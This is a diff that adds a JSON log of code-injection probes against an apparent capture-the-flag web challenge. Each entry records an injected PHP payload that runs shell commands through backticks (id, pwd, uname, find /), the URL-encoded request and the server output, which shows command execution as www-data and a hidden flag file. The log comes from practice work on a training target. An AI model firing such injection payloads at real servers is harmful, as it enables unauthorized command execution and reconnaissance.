@@ -1,0 +1,50 @@
+{
+ "id": {
+  "code": "print(`id`);",
+  "url": "http://node4.anna.nssctf.cn:24112/?code=print%28%60id%60%29%3B",
+  "marker": "EVAL-OK",
+  "out": "uid=33(www-data) gid=33(www-data) groups=33(www-data)\n"
+ },
+ "pwd": {
+  "code": "print(`pwd`);",
+  "url": "http://node4.anna.nssctf.cn:24112/?code=print%28%60pwd%60%29%3B",
+  "marker": "EVAL-OK",
+  "out": "/var/www\n"
+ },
+ "dirroot": {
+  "code": "print(`dir /`);",
+  "url": "http://node4.anna.nssctf.cn:24112/?code=print%28%60dir%20%2F%60%29%3B",
+  "marker": "EVAL-OK",
+  "out": "bin   dev  fffffffffflagafag  lib    media  opt   root\tsbin  sys  usr\nboot  etc  home\t\t      lib64  mnt    proc  run\tsrv   tmp  var\n"
+ },
+ "findroot": {
+  "code": "print(`find / -maxdepth 2`);",
+  "url": "http://node4.anna.nssctf.cn:24112/?code=print%28%60find%20%2F%20-maxdepth%202%60%29%3B",
+  "marker": "EVAL-OK",
+  "out": "/\n/sys\n/sys/kernel\n/sys/power\n/sys/class\n/sys/devices\n/sys/dev\n/sys/hypervisor\n/sys/fs\n/sys/bus\n/sys/firmware\n/sys/block\n/sys/module\n/etc\n/etc/fstab\n/etc/ld.so.cache\n/etc/kernel\n/etc/rc6.d\n/etc/selinux\n/etc/rpc\n/etc/shadow\n/etc/terminfo\n/etc/environment\n/etc/rc3.d\n/etc/shadow-\n/etc/rc5.d\n/etc/sysctl.conf\n/etc/libaudit.conf\n/etc/passwd\n/etc/sysctl.d\n/etc/protocols\n/etc/insserv\n/etc/subuid-\n/etc/issue.net\n/etc/bindresvport.blacklist\n/etc/subuid\n/etc/logrotate.d\n/etc/default\n/etc/issue\n/etc/rc4.d\n/etc/apt\n/etc/pam.conf\n/etc/login.defs\n/etc/init\n/etc/rc0.d\n/etc/insserv.conf\n/etc/ld.so.conf\n/etc/debian_version\n/etc/group\n/etc/subgid-\n/etc/pam.d\n/etc/profile\n/etc/gai.conf\n/etc/nsswitch.conf\n/etc/opt\n/etc/modules-load.d\n/etc/bash.bashrc\n/etc/gshadow-\n/etc/gshadow\n/etc/init.d\n/etc/udev\n/etc/shells\n/etc/profile.d\n/etc/timezone\n/etc/securetty\n/etc/xdg\n/etc/dpkg\n/etc/networks\n/etc/skel\n/etc/inputrc\n/etc/tmpfiles.d\n/etc/resolv.conf\n/etc/mke2fs.conf\n/etc/dbus-1\n/etc/host.conf\n/etc/motd\n/etc/security\n/etc/group-\n/etc/machine-id\n/etc/hosts\n/etc/rc2.d\n/etc/bash_completion.d\n/etc/rmt\n/etc/binfmt.d\n/etc/staff-group-for-usr-local\n/etc/iproute2\n/etc/localtime\n/etc/adduser.conf\n/etc/debconf.conf\n/etc/rc1.d\n/etc/systemd\n/etc/modprobe.d\n/etc/insserv.conf.d\n/etc/hostname\n/etc/ld.so.conf.d\n/etc/deluser.conf\n/etc/rcS.d\n/etc/network\n/etc/cron.daily\n/etc/subgid\n/etc/os-release\n/etc/services\n/etc/alternatives\n/etc/passwd-\n/etc/.pwd.lock\n/etc/rc.local\n/etc/mtab\n/etc/supervisor\n/etc/apache2\n/etc/nanorc\n/etc/mailcap\n/etc/python2.7\n/etc/wgetrc\n/etc/python\n/etc/mime.types\n/etc/mailcap.order\n/etc/ssl\n/etc/ca-certificates.conf\n/etc/magic.mime\n/etc/perl\n/etc/ca-certificates\n/etc/gss\n/etc/ldap\n/etc/magic\n/etc/emacs\n/proc\n/proc/fb\n/proc/fs\n/proc/bus\n/proc/dma\n/proc/irq\n/proc/net\n/proc/sys\n/proc/tty\n/proc/acpi\n/proc/keys\n/proc/kmsg\n/proc/misc\n/proc/mtrr\n/proc/scsi\n/proc/stat\n/proc/iomem\n/proc/kcore\n/proc/locks\n/proc/swaps\n/proc/crypto\n/proc/driver\n/proc/mdstat\n/proc/mounts\n/proc/uptime\n/proc/vmstat\n/proc/cgroups\n/proc/cmdline\n/proc/cpuinfo\n/proc/devices\n/proc/ioports\n/proc/loadavg\n/proc/meminfo\n/proc/modules\n/proc/sysvipc\n/proc/version\n/proc/consoles\n/proc/kallsyms\n/proc/pressure\n/proc/slabinfo\n/proc/softirqs\n/proc/zoneinfo\n/proc/buddyinfo\n/proc/diskstats\n/proc/key-users\n/proc/schedstat\n/proc/interrupts\n/proc/kpagecount\n/proc/kpageflags\n/proc/partitions\n/proc/timer_list\n/proc/execdomains\n/proc/filesystems\n/proc/kpagecgroup\n/proc/sched_debug\n/proc/vmallocinfo\n/proc/pagetypeinfo\n/proc/sysrq-trigger\n/proc/version_signature\n/proc/self\n/proc/thread-self\n/proc/1\n/proc/9\n/proc/10\n/proc/11\n/proc/12\n/proc/13\n/proc/14\n/proc/22\n/proc/40\n/proc/41\n/var\n/var/lock\n/var/cache\n/var/local\n/var/mail\n/var/lib\n/var/tmp\n/var/opt\n/var/spool\n/var/backups\n/var/run\n/var/log\n/var/www\n/bin\n/bin/mountpoint\n/bin/dmesg\n/bin/rm\n/bin/mktemp\n/bin/more\n/bin/which\n/bin/getfacl\n/bin/chmod\n/bin/run-parts\n/bin/systemd-notify\n/bin/gunzip\n/bin/tar\n/bin/domainname\n/bin/su\n/bin/dd\n/bin/wdctl\n/bin/systemctl\n/bin/systemd-tty-ask-password-agent\n/bin/rmdir\n/bin/ping6\n/bin/dash\n/bin/cat\n/bin/mkdir\n/bin/systemd-ask-password\n/bin/udevadm\n/bin/systemd-tmpfiles\n/bin/mv\n/bin/ps\n/bin/zgrep\n/bin/tempfile\n/bin/chown\n/bin/findmnt\n/bin/kill\n/bin/ls\n/bin/uname\n/bin/zfgrep\n/bin/login\n/bin/echo\n/bin/lsblk\n/bin/journalctl\n/bin/zcmp\n/bin/ip\n/bin/gzexe\n/bin/ping\n/bin/rbash\n/bin/false\n/bin/egrep\n/bin/ss\n/bin/dnsdomainname\n/bin/loginctl\n/bin/touch\n/bin/sh.distrib\n/bin/stty\n/bin/bash\n/bin/zegrep\n/bin/true\n/bin/pwd\n/bin/fgrep\n/bin/systemd-machine-id-setup\n/bin/df\n/bin/systemd-escape\n/bin/sleep\n/bin/readlink\n/bin/machinectl\n/bin/cp\n/bin/mknod\n/bin/uncompress\n/bin/sync\n/bin/sed\n/bin/grep\n/bin/znew\n/bin/zless\n/bin/nisdomainname\n/bin/vdir\n/bin/ln\n/bin/date\n/bin/zmore\n/bin/zcat\n/bin/dir\n/bin/systemd-inhibit\n/bin/systemd\n/bin/umount\n/bin/hostname\n/bin/zdiff\n/bin/zforce\n/bin/chacl\n/bin/gzip\n/bin/setfacl\n/bin/chgrp\n/bin/pidof\n/bin/mount\n/bin/tailf\n/bin/ypdomainname\n/bin/sh\n/bin/nano\n/bin/rnano\n/srv\n/lib\n/lib/terminfo\n/lib/startpar\n/lib/init\n/lib/udev\n/lib/lsb\n/lib/systemd\n/lib/x86_64-linux-gnu\n/lib/cpp\n/boot\n/mnt\n/sbin\n/sbin/halt\n/sbin/blkid\n/sbin/switch_root\n/sbin/mkfs.bfs\n/sbin/fsck\n/sbin/dmsetup\n/sbin/isosize\n/sbin/e2label\n/sbin/mkfs.ext3\n/sbin/fstab-decode\n/sbin/hwclock\n/sbin/bridge\n/sbin/mkhomedir_helper\n/sbin/swapoff\n/sbin/insserv\n/sbin/setcap\n/sbin/poweroff\n/sbin/e2image\n/sbin/findfs\n/sbin/logsave\n/sbin/udevadm\n/sbin/tune2fs\n/sbin/swapon\n/sbin/blockdev\n/sbin/badblocks\n/sbin/rtacct\n/sbin/mkfs.ext4\n/sbin/sulogin\n/sbin/fdisk\n/sbin/init\n/sbin/installkernel\n/sbin/mkfs.ext2\n/sbin/resize2fs\n/sbin/shadowconfig\n/sbin/mkfs.minix\n/sbin/chcpu\n/sbin/sfdisk\n/sbin/losetup\n/sbin/blkdiscard\n/sbin/ip\n/sbin/swaplabel\n/sbin/pam_tally\n/sbin/shutdown\n/sbin/debugfs\n/sbin/fsck.ext4\n/sbin/pam_tally2\n/sbin/mke2fs\n/sbin/mkfs\n/sbin/fsck.ext4dev\n/sbin/start-stop-daemon\n/sbin/runlevel\n/sbin/dumpe2fs\n/sbin/raw\n/sbin/fsck.ext3\n/sbin/runuser\n/sbin/unix_update\n/sbin/sysctl\n/sbin/tc\n/sbin/ctrlaltdel\n/sbin/e2undo\n/sbin/ldconfig\n/sbin/e2fsck\n/sbin/unix_chkpwd\n/sbin/fsfreeze\n/sbin/mkswap\n/sbin/fstrim\n/sbin/rtmon\n/sbin/initctl\n/sbin/killall5\n/sbin/mkfs.cramfs\n/sbin/reboot\n/sbin/udevd\n/sbin/fsck.nfs\n/sbin/fsck.minix\n/sbin/ldconfig.real\n/sbin/getty\n/sbin/capsh\n/sbin/fsck.cramfs\n/sbin/getcap\n/sbin/mkfs.ext4dev\n/sbin/fsck.ext2\n/sbin/agetty\n/sbin/telinit\n/sbin/getpcaps\n/sbin/pivot_root\n/sbin/cfdisk\n/sbin/wipefs\n/tmp\n/tmp/pear\n/dev\n/dev/core\n/dev/stderr\n/dev/stdout\n/dev/stdin\n/dev/fd\n/dev/ptmx\n/dev/urandom\n/dev/zero\n/dev/tty\n/dev/full\n/dev/random\n/dev/null\n/dev/shm\n/dev/mqueue\n/dev/pts\n/opt\n/usr\n/usr/local\n/usr/bin\n/usr/src\n/usr/include\n/usr/lib\n/usr/sbin\n/usr/share\n/usr/games\n/media\n/lib64\n/lib64/ld-linux-x86-64.so.2\n/root\n/run\n/run/lock\n/run/utmp\n/run/supervisord.pid\n/run/supervisor.sock\n/run/apache2\n/home\n/.dockerenv\n/fffffffffflagafag\n"
+ },
+ "uname": {
+  "code": "print(`uname -a`);",
+  "url": "http://node4.anna.nssctf.cn:24112/?code=print%28%60uname%20-a%60%29%3B",
+  "marker": "EVAL-OK",
+  "out": "Linux anna17d1296f7c_sservice 5.4.0-77-generic #86-Ubuntu SMP Thu Jun 17 02:35:03 UTC 2021 x86_64 GNU/Linux\n"
+ },
+ "ctrl_benign": {
+  "code": "print(1);",
+  "url": "http://node4.anna.nssctf.cn:24112/?code=print%281%29%3B",
+  "marker": "EVAL-OK",
+  "out": "1"
+ },
+ "ctrl_banned_plus": {
+  "code": "print(1+1);",
+  "url": null,
+  "marker": "BLOCKED-LOCALLY(+)",
+  "out": ""
+ },
+ "ctrl_banned_dot": {
+  "code": "print(1);print(2);print(3);",
+  "url": "http://node4.anna.nssctf.cn:24112/?code=print%281%29%3Bprint%282%29%3Bprint%283%29%3B",
+  "marker": "EVAL-OK",
+  "out": "123"
+ }
+}
